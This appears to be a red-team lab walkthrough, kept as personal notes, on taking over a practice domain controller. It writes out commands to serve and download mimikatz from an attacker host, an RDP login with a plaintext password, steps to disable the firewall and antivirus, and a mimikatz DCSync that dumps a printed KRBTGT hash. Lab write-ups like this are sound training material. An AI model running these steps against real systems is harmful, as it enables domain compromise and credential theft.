## Download mimikatz

[[Dumping secrets from CORPDC#Connect to RDP with the Administrator's credentials|Connect to CORP.DC with Administration credentials]]


### Enable http.server using python and proxychains on the Attacking machine


~/…/red_team_recon/Capstone_Challenge/Capstone_Challenge_Resources/Tools/mimikatz_trunk/x64$  `proxychains -q python3 -m http.server`

### Get mimikatz
On the tools provided on Capstone challenge folder you can find mimikatz.
Run on the Evil-WinRM shell the following command.

Evil-WinRM* PS C:\Users\Administrator> `wget http://10.50.110.16:8000/mimikatz.exe -o mimikatz.exe`

#### Connect to RDP with the Administrator's credentials

$ `proxychains4 -q xfreerdp /v:10.200.113.102 /u:Administrator /p:Hacker@123` 


## Disable CORP.DC firewall

Disabled firewall.
![[Preparing the path-20240607144158824.webp]]
## Disable virus protection

Disable virus and turned off Real-time protection from settings.
- **Open Windows Security:**
    
    - Click on the **Start** button.
    - Type **Windows Security** in the search bar and press Enter.
    - Alternatively, you can also find it by navigating through **Settings > Update & Security > Windows Security**.
    - ![[Preparing the path-20240607143234384.webp]]

## Performing DCSync Attack

Use this attack to gather NTLM of KRBTGT. To know more about this attack, check [here](https://www.alteredsecurity.com/post/a-primer-on-dcsync-attack-and-detection).

- Open a powershell.
- Run mimikatz (Rememder where you saved it).
	PS C:\Users\Administrator\Documents> `.\mimikatz.exe`

### Mimikatz commands

mimikatz # `privilege::debug`
mimikatz # `lsadump::dcsync /user:corp\krbtgt`

![[Preparing the path-20240607145323252.webp]]
As you can see in the above screenshot we were able to perform DCSync attack successfully and retrieve the KRBTGT account hash.

> KRBTGT NTLM hash: 0c757a3445acb94a654554f3ac529ede

### Dumping SID of **CORPDC**

PS C:\Users\Administrator\Documents> `Get-ADComputer -Identity "CORPDC"`

![[Preparing the path-20240607151619249.webp]]